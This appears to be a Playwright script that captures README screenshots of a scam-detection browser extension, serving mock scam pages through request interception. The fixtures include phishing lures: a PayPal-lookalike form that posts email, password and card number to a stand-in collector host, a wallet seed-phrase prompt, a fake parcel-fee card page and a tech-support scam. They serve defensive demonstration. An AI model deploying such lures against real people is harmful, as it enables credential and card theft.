/*
 * Renders the README scenario screenshots into docs/ using the real extension
 * in Chromium. Pages are served through request interception so no real scam
 * site is contacted. Run: node tools/docs-screenshots.js
 */
const path = require('path');
const fs = require('fs');
const { chromium } = require('playwright');

const EXT = path.resolve(__dirname, '..');
const OUT = path.join(EXT, 'docs');
fs.mkdirSync(OUT, { recursive: true });

const page = (title, body, extraHead) => `<!doctype html><html><head><meta charset="utf-8"><title>${title}</title>${extraHead || ''}
<style>body{font-family:Helvetica,Arial,sans-serif;margin:0;background:#f5f7fa;color:#222}.card{background:#fff;max-width:460px;margin:110px auto 0;padding:32px 36px;border-radius:12px;box-shadow:0 2px 10px rgba(0,0,0,.08)}h1{margin:0 0 8px;font-size:26px}p{color:#444;line-height:1.5}label{display:block;margin:12px 0 4px;font-size:13px;color:#555}input{width:100%;padding:11px;border:1px solid #ccc;border-radius:6px;font-size:15px;box-sizing:border-box}button{width:100%;margin-top:16px;padding:12px;border:0;border-radius:8px;font-size:16px;font-weight:600;color:#fff;background:#0070ba}.foot{text-align:center;color:#888;font-size:12px;margin-top:22px}.foot a{color:#888;margin:0 5px}.pill{display:inline-block;background:#fff3cd;color:#7a5a00;padding:4px 10px;border-radius:12px;font-size:12px;font-weight:600}.big{font-size:40px;font-weight:800;color:#b71c1c;margin:0}</style></head><body>${body}</body></html>`;

const SCENARIOS = {
  'https://paypal-secure-login-2026.xyz/signin': page('Log in to your PayPal account', `
    <div class="card"><h1 style="color:#003087">PayPal</h1><p>Your account has been limited. Verify your identity within 24 hours or your account will be suspended.</p>
    <form method="post" action="https://collect.evil-host.top/l.php"><label>Email</label><input type="email" name="email"><label>Password</label><input type="password" name="password"><label>Card number</label><input name="cardnumber"><button>Log In</button></form>
    <div class="foot"><a href="#">Help</a><a href="#">Contact</a><a href="#">Fees</a><a href="#">Security</a><a href="#">Privacy</a><a href="#">Legal</a><br><br>© 2026 PayPal Inc.</div></div>`,
    '<link rel="icon" href="https://www.paypalobjects.com/webstatic/icon/pp258.png">'),
  'https://crypto-profit-now.xyz/': page('Double your Bitcoin in 24 hours', `
    <div class="card" style="max-width:520px"><span class="pill">LIMITED SPOTS AVAILABLE</span><h1>Double your Bitcoin in 24 hours</h1>
    <p>Guaranteed returns of 5% daily with our automated trading bot. Risk-free investment, 100% safe and verified. Send 0.1 BTC and receive 0.2 BTC back. Connect your wallet to claim your welcome airdrop.</p>
    <form><label>Wallet recovery phrase (12 words)</label><input name="seed_phrase" placeholder="word1 word2 word3 …"><button style="background:#f7931a">Connect wallet &amp; claim</button></form>
    <div class="foot">As seen on Forbes and CNN · Elon Musk approved giveaway</div></div>`),
  'https://ctt-entregas-reagendar.sbs/encomenda/88213': page('CTT - Entrega pendente', `
    <div class="card"><h1 style="color:#c8102e">CTT Expresso</h1><p>A sua encomenda está retida no nosso centro de distribuição porque a morada está incompleta. Pague a taxa de reenvio de <strong>€1,99</strong> nas próximas 24 horas para reagendar a entrega.</p>
    <form><label>Nome completo</label><input name="nome"><label>Número do cartão</label><input name="numero_cartao"><label>CVV</label><input name="cvv"><button style="background:#c8102e">Pagar €1,99 e reagendar</button></form>
    <div class="foot">© CTT – Correios de Portugal</div></div>`),
  'https://security-alert-center.live/': page('Windows Security Alert', `
    <div class="card" style="max-width:560px;border:3px solid #b71c1c"><p class="big">⚠ Windows Security Alert</p>
    <p><strong>Your computer is infected</strong> with 5 viruses detected. Do not close this window or restart your computer. Error code 0x80073D1F. Call Microsoft Support now toll-free: <strong>+1 (888) 555-0142</strong>.</p>
    <p>Microsoft Defender has blocked access to your files. Immediate action required to avoid data loss.</p><button style="background:#b71c1c">Call support now</button></div>`),
  'https://mega-brand-outlet.top/sale': page('Designer outlet – 90% off today only', `
    <div class="card" style="max-width:520px"><span class="pill">OFFER ENDS TODAY</span><h1>Designer bags up to 90% off</h1><p>Only 3 items left! Sale ends tonight. We only accept bank transfer. 100% secure checkout guaranteed, as seen on TV.</p>
    <form><label>Email</label><input type="email"><label>Create password</label><input type="password"><button style="background:#111">Checkout now</button></form>
    <div class="foot"><a href="#">Shipping</a><a href="#">Returns</a><a href="#">Contact</a><a href="#">Terms</a><a href="#">Privacy</a></div></div>`),
  'https://www.olx.pt/mensagens/123': `<!doctype html><html><head><meta charset="utf-8"><title>OLX - Mensagens</title>
    <style>body{font-family:Helvetica,Arial,sans-serif;background:#f2f4f5;margin:0}.top{background:#002f34;color:#fff;padding:14px 32px;font-weight:700;font-size:20px}.wrap{max-width:720px;margin:110px auto 0;background:#fff;border-radius:10px;padding:20px 24px;box-shadow:0 1px 6px rgba(0,0,0,.08)}h2{font-size:16px;margin:0 0 14px;color:#002f34}.message{max-width:78%;padding:10px 14px;border-radius:14px;margin:8px 0;font-size:15px;line-height:1.45}.in{background:#eef2f3}.out{background:#d7f3e3;margin-left:auto}textarea{width:100%;margin-top:14px;padding:10px;border:1px solid #ccc;border-radius:8px;font:inherit;box-sizing:border-box}</style></head>
    <body><div class="top">OLX</div><div class="wrap"><h2>Conversa com "Pedro M."</h2><div class="chat-thread" data-testid="chat-messages">
    <div class="message in">Olá, o artigo ainda está disponível?</div><div class="message out">Sim, está disponível.</div>
    <div class="message in">Óptimo! Estou fora do país neste momento, mas envio um estafeta para levantar o artigo. O pagamento é feito através da transportadora. Clica no link para receber o pagamento e introduz os dados do cartão: https://olx-entregas-pagamento.com/receber/18273</div>
    </div><textarea placeholder="Escreva uma mensagem"></textarea></div></body></html>`,
  'https://docs.google.com/forms/d/e/1FAIpQLSd-phish-demo/viewform': page('Microsoft 365 – Sign in to view the shared document', `
    <div class="card"><h1 style="color:#0067b8">Microsoft 365</h1><p>A document has been shared with you. Sign in with your work email and password to view it.</p>
    <form><label>Email</label><input type="email"><label>Password</label><input type="password"><button style="background:#0067b8">View document</button></form></div>`),
  'https://mindera.com/': page('Mindera - Software Engineering', `
    <div class="card" style="max-width:640px;margin-top:140px"><h1>Mindera</h1><p>We build software that matters. Partnering with clients to design, build and run high-performance, resilient software systems.</p>
    <p><a href="/about">About</a> · <a href="/careers">Careers</a> · <a href="/work">Work</a> · <a href="/blog">Blog</a> · <a href="/contact">Contact</a></p></div>`),
};

async function latestResult(sw) {
  return sw.evaluate(async () => {
    const all = await chrome.storage.session.get(null);
    return Object.entries(all).filter(([k]) => k.startsWith('result:')).map(([, v]) => v).sort((a, b) => b.analyzedAt - a.analyzedAt)[0];
  });
}

async function main() {
  const ctx = await chromium.launchPersistentContext('', {
    headless: true, channel: 'chromium', deviceScaleFactor: 2,
    args: [`--disable-extensions-except=${EXT}`, `--load-extension=${EXT}`],
    viewport: { width: 1000, height: 640 },
  });
  try {
    let [sw] = ctx.serviceWorkers(); if (!sw) sw = await ctx.waitForEvent('serviceworker', { timeout: 15000 });
    const extId = sw.url().split('/')[2];
    await sw.evaluate(async () => {
      const s = (await chrome.storage.sync.get('settings')).settings || {};
      await chrome.storage.sync.set({ settings: Object.assign({}, s, { chatMonitorEnabled: true }) });
    });
    const p = await ctx.newPage();
    await p.route('**/*', (route) => {
      const url = route.request().url();
      for (const [u, html] of Object.entries(SCENARIOS)) if (url === u || url.startsWith(u + (u.endsWith('/') ? '' : '?'))) return route.fulfill({ contentType: 'text/html; charset=utf-8', body: html });
      if (url.startsWith('https://www.paypalobjects.com/')) return route.fulfill({ contentType: 'image/png', body: Buffer.alloc(0) });
      return route.abort();
    });

    const shot = async (url, file, opts) => {
      opts = opts || {};
      await p.goto(url, { waitUntil: 'domcontentloaded' });
      if (opts.expectBanner !== false) await p.waitForSelector('#scam-detector-banner-host', { timeout: 20000 }); else await p.waitForTimeout(2500);
      await p.waitForTimeout(600);
      if (opts.expand) {
        await sw.evaluate(async (u) => { const [t] = await chrome.tabs.query({ url: u + '*' }); await chrome.tabs.sendMessage(t.id, { type: 'EXPAND_DETAILS' }); }, url.split('?')[0]);
        await p.waitForTimeout(300);
      }
      await p.screenshot({ path: path.join(OUT, file) });
      const r = await latestResult(sw);
      console.log(`${file}: ${r ? r.verdict + ' ' + r.score + ' [' + r.signals.map((s) => s.id).join(',') + ']' : 'no result'}`);
      return r;
    };

    await shot('https://paypal-secure-login-2026.xyz/signin', 'scenario-phishing-login.png', { expand: true });
    await shot('https://crypto-profit-now.xyz/', 'scenario-crypto-investment.png', { expand: true });
    await shot('https://ctt-entregas-reagendar.sbs/encomenda/88213', 'scenario-parcel-fee-pt.png', { expand: true });
    await shot('https://security-alert-center.live/', 'scenario-tech-support.png', { expand: true });
    await shot('https://mega-brand-outlet.top/sale', 'scenario-suspicious-shop.png', { expand: true });
    await shot('https://www.olx.pt/mensagens/123', 'scenario-chat-monitor.png', { expand: true });

    // Reported page on a shared host, via an injected feed index
    const feedUrl = 'https://docs.google.com/forms/d/e/1FAIpQLSd-phish-demo/viewform';
    await sw.evaluate(async (url) => {
      if (feedUpdating) { try { await feedUpdating; } catch (e) { /* ignore */ } }
      const idx = await self.SD.urlmatch.buildIndex([{ url, target: 'Microsoft' }]);
      await chrome.storage.local.set({ 'feed:phishtank': idx, 'feedmeta:phishtank': { updatedAt: Date.now(), count: 48552, hosts: 11008, etag: 'docs', lastError: '' } });
      feedIndexCache = idx;
    }, feedUrl);
    await shot(feedUrl, 'scenario-reported-page.png', { expand: true });
    const phishTab = await sw.evaluate(async () => (await chrome.tabs.query({ url: 'https://docs.google.com/*' }))[0].id);

    // Popups
    const popup = await ctx.newPage();
    await popup.setViewportSize({ width: 360, height: 600 });
    await popup.goto(`chrome-extension://${extId}/popup/popup.html?tabId=${phishTab}`);
    await popup.waitForTimeout(1000);
    await popup.screenshot({ path: path.join(OUT, 'popup-reported.png'), fullPage: true });
    await p.goto('https://paypal-secure-login-2026.xyz/signin', { waitUntil: 'domcontentloaded' });
    await p.waitForSelector('#scam-detector-banner-host', { timeout: 20000 });
    const ppTab = await sw.evaluate(async () => (await chrome.tabs.query({ url: 'https://paypal-secure-login-2026.xyz/*' }))[0].id);
    await popup.goto(`chrome-extension://${extId}/popup/popup.html?tabId=${ppTab}`);
    await popup.waitForTimeout(1000);
    await popup.screenshot({ path: path.join(OUT, 'popup-findings.png'), fullPage: true });
    await shot('https://mindera.com/', 'scenario-benign.png', { expectBanner: false });
    const okTab = await sw.evaluate(async () => (await chrome.tabs.query({ url: 'https://mindera.com/*' }))[0].id);
    await popup.goto(`chrome-extension://${extId}/popup/popup.html?tabId=${okTab}`);
    await popup.waitForTimeout(1200);
    await popup.screenshot({ path: path.join(OUT, 'popup-ok.png'), fullPage: true });

    // Options
    const options = await ctx.newPage();
    await options.setViewportSize({ width: 820, height: 1000 });
    await options.goto(`chrome-extension://${extId}/options/options.html`);
    await options.waitForTimeout(800);
    await options.screenshot({ path: path.join(OUT, 'options.png'), fullPage: true });
    await sw.evaluate(async () => { await chrome.storage.local.remove(['feed:phishtank', 'feedmeta:phishtank']); feedIndexCache = null; });
    console.log('written to ' + OUT);
  } finally {
    await ctx.close();
  }
}
main().catch((e) => { console.error(e); process.exit(1); });
